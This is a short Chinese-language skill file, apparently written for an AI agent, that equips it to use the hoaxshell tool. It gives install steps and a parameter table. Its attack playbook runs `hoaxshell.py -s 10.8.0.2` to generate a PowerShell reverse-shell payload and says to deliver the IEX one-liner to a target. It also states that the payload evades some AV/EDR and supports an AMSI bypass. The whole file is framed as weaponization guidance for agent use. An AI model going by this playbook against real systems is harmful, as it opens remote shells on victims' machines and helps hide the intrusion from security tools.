---
name: hoaxshell-powershell
description: 渗透工具 skill:hoaxshell 的安装、参数速查与攻击场景 playbook。当任务涉及 载荷开发与武器化 需要调用 hoaxshell 时使用。
---

# hoaxshell

- 攻击大类:C07 载荷开发与武器化
- 上游仓库:https://github.com/t3l3machus/hoaxshell
- 上游 License:BSD-2-Clause(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/t3l3machus/hoaxshell && cd hoaxshell
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `sudo python3 hoaxshell.py -s <attacker_ip>` | 生成 PS 反弹载荷 |
| `-g` | 生成后仅打印 |
| `-t` | 加密传输 |
| `-p 8080` | 端口 |
| `-i` | 交互模式 |
| `--exec-outfile` | 落地执行 |

## 攻击场景 Playbook

### PowerShell 会话反弹

```bash
sudo python3 hoaxshell.py -s 10.8.0.2
# 把输出的 IEX one-liner 投递到目标,会话自动升级
```

## 注意事项

生成的 IEX 载荷无 msfvenom 特征,部分 AV/EDR 不拦;支持 TLS 加密与 AMSI 绕过开关。
